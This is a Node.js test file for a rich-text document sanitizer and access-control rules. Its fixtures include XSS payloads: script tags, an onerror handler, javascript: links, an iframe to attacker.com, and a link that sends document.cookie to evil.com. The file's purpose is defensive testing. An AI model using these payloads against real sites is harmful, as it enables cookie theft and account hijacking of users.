import test from "node:test";
import assert from "node:assert/strict";
import mongoose from "mongoose";
import {
  sanitizeDocumentHtml,
  sanitizeDocumentJson,
  extractPlainTextExcerpt,
} from "../src/utils/documentSanitizer.js";

test("DOC-01: Document HTML Sanitization & XSS Prevention", async (t) => {
  await t.test("strips script tags and inline event handlers from rich text HTML", () => {
    const maliciousHtml = `
      <h1>Project Architecture</h1>
      <p>Clean paragraph</p>
      <script>alert("XSS")</script>
      <img src="valid.png" onerror="alert('pwned')" />
      <a href="javascript:stealCookies()">Click me</a>
    `;

    const sanitized = sanitizeDocumentHtml(maliciousHtml);
    assert.equal(sanitized.includes("<script>"), false);
    assert.equal(sanitized.includes("alert"), false);
    assert.equal(sanitized.includes("onerror"), false);
    assert.equal(sanitized.includes("javascript:"), false);
    assert.ok(sanitized.includes("<h1>Project Architecture</h1>"));
    assert.ok(sanitized.includes("<p>Clean paragraph</p>"));
    assert.ok(sanitized.includes('href="#"'));
  });

  await t.test("strips dangerous iframes, objects, and base tags", () => {
    const dangerousHtml = `
      <iframe src="https://attacker.com/keylogger"></iframe>
      <object data="malicious.swf"></object>
      <embed src="exploit.pdf" />
      <base href="https://evil.com/" />
      <blockquote>Legitimate team quote</blockquote>
    `;

    const sanitized = sanitizeDocumentHtml(dangerousHtml);
    assert.equal(sanitized.includes("<iframe"), false);
    assert.equal(sanitized.includes("<object"), false);
    assert.equal(sanitized.includes("<embed"), false);
    assert.equal(sanitized.includes("<base"), false);
    assert.ok(sanitized.includes("<blockquote>Legitimate team quote</blockquote>"));
  });

  await t.test("preserves valid TipTap rich text tags", () => {
    const validRichHtml = `
      <h2>Meeting Notes</h2>
      <p>Key takeaways: <strong>Bold text</strong>, <em>Italic text</em>, <u>Underline</u></p>
      <ul><li>Item 1</li><li>Item 2</li></ul>
      <ol><li>Step 1</li></ol>
      <pre><code>const a = 1;</code></pre>
      <a href="https://github.com/thisisanimesh01/Klavo">Repository</a>
    `;

    const sanitized = sanitizeDocumentHtml(validRichHtml);
    assert.ok(sanitized.includes("<h2>Meeting Notes</h2>"));
    assert.ok(sanitized.includes("<strong>Bold text</strong>"));
    assert.ok(sanitized.includes("<em>Italic text</em>"));
    assert.ok(sanitized.includes("<u>Underline</u>"));
    assert.ok(sanitized.includes("<ul><li>Item 1</li><li>Item 2</li></ul>"));
    assert.ok(sanitized.includes("<pre><code>const a = 1;</code></pre>"));
    assert.ok(sanitized.includes('href="https://github.com/thisisanimesh01/Klavo"'));
  });
});

test("DOC-01: ProseMirror / TipTap JSON Tree Sanitizer", async (t) => {
  await t.test("sanitizes javascript: links in TipTap mark attributes", () => {
    const dirtyJson = {
      type: "doc",
      content: [
        {
          type: "paragraph",
          content: [
            {
              type: "text",
              text: "Click here for reward",
              marks: [
                {
                  type: "link",
                  attrs: { href: "javascript:document.location='http://evil.com?c='+document.cookie" },
                },
              ],
            },
          ],
        },
      ],
    };

    const clean = sanitizeDocumentJson(dirtyJson);
    const linkMark = clean.content[0].content[0].marks[0];
    assert.equal(linkMark.attrs.href, "#");
  });

  await t.test("falls back unknown node types to paragraph", () => {
    const unknownNodeJson = {
      type: "doc",
      content: [
        {
          type: "maliciousCustomPluginNode",
          content: [{ type: "text", text: "harmless text" }],
        },
      ],
    };

    const clean = sanitizeDocumentJson(unknownNodeJson);
    assert.equal(clean.content[0].type, "paragraph");
  });
});

test("DOC-01: Document Plain Text Excerpt Extractor", async (t) => {
  await t.test("extracts clean unescaped plain text excerpt from HTML", () => {
    const html = "<h1>Sprint 1 Retrospective</h1><p>The sprint was <strong>highly successful</strong> with zero blocker gates left unresolved.</p>";
    const excerpt = extractPlainTextExcerpt(html, 50);
    assert.ok(excerpt.startsWith("Sprint 1 Retrospective"));
    assert.equal(excerpt.includes("<h1>"), false);
    assert.equal(excerpt.includes("<strong>"), false);
  });
});

test("DOC-01: Document IDOR Protection & Multi-Tenant Boundaries", async (t) => {
  const aliceId = new mongoose.Types.ObjectId().toString();
  const bobId = new mongoose.Types.ObjectId().toString();
  const eveId = new mongoose.Types.ObjectId().toString();

  const documents = [
    { _id: "doc_1", title: "Project Alpha Spec", projectId: "proj_1", createdBy: aliceId },
    { _id: "doc_2", title: "Project Beta Roadmap", projectId: "proj_2", createdBy: bobId },
  ];

  await t.test("enforces that user can only access documents belonging to authorized projects", () => {
    const userProjects = {
      [aliceId]: ["proj_1"],
      [bobId]: ["proj_2"],
      [eveId]: [],
    };

    const canAccessDocument = (doc, userId) => {
      const allowedProjects = userProjects[userId] || [];
      return allowedProjects.includes(doc.projectId);
    };

    assert.equal(canAccessDocument(documents[0], aliceId), true);
    assert.equal(canAccessDocument(documents[0], bobId), false); // Cross-project IDOR blocked
    assert.equal(canAccessDocument(documents[1], bobId), true);
    assert.equal(canAccessDocument(documents[1], eveId), false); // Outsider blocked
  });

  await t.test("enforces document deletion restricted to creator or team owner", () => {
    const canDeleteDocument = (doc, userId, isTeamOwner) => {
      if (isTeamOwner) return true;
      return doc.createdBy === userId;
    };

    assert.equal(canDeleteDocument(documents[0], aliceId, false), true);
    assert.equal(canDeleteDocument(documents[0], bobId, false), false);
    assert.equal(canDeleteDocument(documents[0], bobId, true), true); // Team owner override
  });
});
